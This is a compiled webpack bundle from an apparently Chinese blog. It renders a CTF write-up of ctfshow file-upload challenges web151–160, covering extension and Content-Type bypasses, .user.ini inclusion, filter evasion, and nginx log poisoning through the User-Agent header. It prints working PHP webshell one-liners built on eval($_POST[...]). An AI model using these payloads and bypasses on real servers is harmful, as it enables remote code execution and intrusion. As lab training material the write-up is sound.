"use strict";(self.webpackChunkreicalg=self.webpackChunkreicalg||[]).push([[404],{3860:(e,l,a)=>{a.r(l),a.d(l,{data:()=>t});const t={key:"v-d57b2632",path:"/web/web2.html",title:"文件上传刷题",lang:"zh-CN",frontmatter:{date:"2023/6/6 19:57",stick:!1,keyword:"web,ctfshow",description:"刷题",title:"文件上传刷题",tag:["ctfshow刷题"],categories:["文件上传","歪比八卜"]},excerpt:"",headers:[{level:2,title:"文件上传",slug:"文件上传",children:[]},{level:2,title:"Web151",slug:"web151",children:[{level:3,title:"Web152",slug:"web152",children:[]},{level:3,title:"Web153",slug:"web153",children:[]},{level:3,title:"Web154",slug:"web154",children:[]},{level:3,title:"Web155",slug:"web155",children:[]},{level:3,title:"web156",slug:"web156",children:[]},{level:3,title:"web157",slug:"web157",children:[]},{level:3,title:"web158",slug:"web158",children:[]},{level:3,title:"web159",slug:"web159",children:[]},{level:3,title:"web160",slug:"web160",children:[]}]}],git:{}}},2933:(e,l,a)=>{a.r(l),a.d(l,{default:()=>L});var t=a(6252);const n=(0,t._)("h2",{id:"文件上传",tabindex:"-1"},[(0,t._)("a",{class:"header-anchor",href:"#文件上传","aria-hidden":"true"},"#"),(0,t.Uk)(" 文件上传")],-1),i=(0,t._)("h2",{id:"web151",tabindex:"-1"},[(0,t._)("a",{class:"header-anchor",href:"#web151","aria-hidden":"true"},"#"),(0,t.Uk)(" Web151")],-1),o=(0,t._)("blockquote",null,[(0,t._)("p",null,"（前端验证）")],-1),c=(0,t._)("p",null,[(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"image1",originSrc:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071533948.png",data:"aurora"})],-1),r=(0,t._)("blockquote",null,[(0,t._)("p",null,"在前端会有一些对后缀的过滤，前端过滤就进HTML检查元素把里面的限制语句直接删掉或者改成要上传的后缀名就能上传了，最简单方法就抓包改后缀就行了"),(0,t._)("p",null,"上传一个小马就能rce")],-1),u=(0,t._)("h3",{id:"web152",tabindex:"-1"},[(0,t._)("a",{class:"header-anchor",href:"#web152","aria-hidden":"true"},"#"),(0,t.Uk)(" Web152")],-1),s=(0,t._)("blockquote",null,[(0,t._)("p",null,"(后端验证）")],-1),p=(0,t._)("p",null,[(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"image3",originSrc:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071551531.png",data:"aurora"})],-1),g=(0,t._)("p",null,[(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"image4",originSrc:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071552063.png",data:"aurora"})],-1),b=(0,t._)("p",null,"更改content-type在HTTP协议消息头中，使用Content-Type来表示媒体类型信息。它被用来告诉服务端如何处理请求的数据，以及告诉客户端（一般是浏览器）如何解析响应的数据，比如显示图片，解析html或仅仅展示一个文本等。",-1),d={href:"https://blog.csdn.net/qq_14869093/article/details/86307084",target:"_blank",rel:"noopener noreferrer"},h=(0,t.Uk)("Content-Type 详解_"),m=(0,t._)("p",null,"抓包后修改content-type 再发包就能绕过后端过滤",-1),_=(0,t._)("p",null,[(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"image5",originSrc:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071553673.png",data:"aurora"})],-1),q=(0,t._)("h3",{id:"web153",tabindex:"-1"},[(0,t._)("a",{class:"header-anchor",href:"#web153","aria-hidden":"true"},"#"),(0,t.Uk)(" Web153")],-1),w=(0,t._)("blockquote",null,[(0,t._)("p",null,"ini文件包含绕过")],-1),k=(0,t._)("p",null,[(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"image5",originSrc:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071605355.png",data:"aurora"})],-1),v=(0,t.Uk)("upload文件夹能够直接访问，说明有index.php文件，所以能够用.user.ini"),f={href:"https://blog.csdn.net/weixin_52635170/article/details/126962920",target:"_blank",rel:"noopener noreferrer"},x=(0,t.Uk)(".user.ini漏洞"),y=(0,t._)("blockquote",null,[(0,t._)("p",null,".user.ini中两个中的配置就是auto_prepend_file和auto_append_file。这两个配置的意思就是：我们指定一个文件（如1.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），相当于在index.php中插入一句：require(./1.jpg)。这两个设置的区别只是在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入。")],-1),j=(0,t._)("blockquote",null,[(0,t._)("p",null,"利用.user.ini的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有index.php可执行文件。")],-1),z=(0,t._)("p",null,[(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"image8",originSrc:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071708978.png",data:"aurora"})],-1),S=(0,t._)("p",null,[(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"image9",originSrc:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071709155.png",data:"aurora"})],-1),W=(0,t._)("blockquote",null,[(0,t._)("p",null,"这样index.php就包含了1.txt的马然后rce")],-1),T=(0,t._)("p",null,[(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"image10",originSrc:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071710997.png",data:"aurora"})],-1),U=(0,t._)("blockquote",null,[(0,t._)("p",null,"也可以用日志文件包含做")],-1),C=(0,t._)("h3",{id:"web154",tabindex:"-1"},[(0,t._)("a",{class:"header-anchor",href:"#web154","aria-hidden":"true"},"#"),(0,t.Uk)(" Web154")],-1),P=(0,t._)("p",null,[(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"image11",originSrc:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071710482.png",data:"aurora"})],-1),H=(0,t.uE)('<blockquote><p>过滤了”php”内容 php语言对函数名、方法名、类名大小写不敏感 使用大写 或者短标签</p></blockquote><blockquote><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>&lt;?=eval($_POST[1]);？&gt; &lt;?PHP eval($_POST[1]);？&gt;\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div></blockquote><blockquote><p>没限制就继续用.user.ini漏洞写入包含文件</p></blockquote><h3 id="web155" tabindex="-1"><a class="header-anchor" href="#web155" aria-hidden="true">#</a> Web155</h3><blockquote><p>同上</p></blockquote><h3 id="web156" tabindex="-1"><a class="header-anchor" href="#web156" aria-hidden="true">#</a> web156</h3><blockquote><p>过滤了[]，用{}代替即可:</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>&lt;?=eval($_POST{cmd});?&gt;\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div></blockquote><h3 id="web157" tabindex="-1"><a class="header-anchor" href="#web157" aria-hidden="true">#</a> web157</h3><blockquote><p>多过滤了分号，改一下即可：</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div></blockquote><h3 id="web158" tabindex="-1"><a class="header-anchor" href="#web158" aria-hidden="true">#</a> web158</h3><blockquote><p>同上</p></blockquote><h3 id="web159" tabindex="-1"><a class="header-anchor" href="#web159" aria-hidden="true">#</a> web159</h3><blockquote><p>同上</p></blockquote><h3 id="web160" tabindex="-1"><a class="header-anchor" href="#web160" aria-hidden="true">#</a> web160</h3><blockquote><p>本题多过滤了括号和反引号，而且还过滤了log，日志包含也能做，用字符串拼接(php中用.来连接字符串)构造log:</p></blockquote><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;\n&lt;script language=&#39;php&#39;&gt;eval($_POST[1]); &lt;/script&gt;\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><blockquote><p>这种小马在&lt;?被过滤时用</p></blockquote>',17),O=(0,t._)("p",null,[(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"image20",originSrc:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071745551.png",data:"aurora"})],-1),$=(0,t._)("blockquote",null,[(0,t._)("p",null,"然后上传.user.ini包含该文件即可：auto_append_file=/var/www/html/upload/hack.png")],-1),I=(0,t._)("blockquote",null,[(0,t._)("p",null,"然后在UA头改为想执行的命令访问主页，最后访问/upload，看看log里命令执行结果即可即可")],-1),E=(0,t._)("p",null,[(0,t._)("img",{src:"https://ooszy.cco.vin/img/blog-public/ljz.gif",alt:"image-20230607174625433",originSrc:"https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071746472.png",data:"aurora"})],-1),G={},L=(0,a(3744).Z)(G,[["render",function(e,l){const a=(0,t.up)("ExternalLinkIcon");return(0,t.wg)(),(0,t.iD)(t.HY,null,[n,i,o,c,r,u,s,p,g,(0,t._)("blockquote",null,[b,(0,t._)("p",null,[(0,t._)("a",d,[h,(0,t.Wm)(a)])]),m]),_,q,w,k,(0,t._)("blockquote",null,[(0,t._)("p",null,[v,(0,t._)("a",f,[x,(0,t.Wm)(a)])])]),y,j,z,S,W,T,U,C,P,H,O,$,I,E],64)}]])}}]);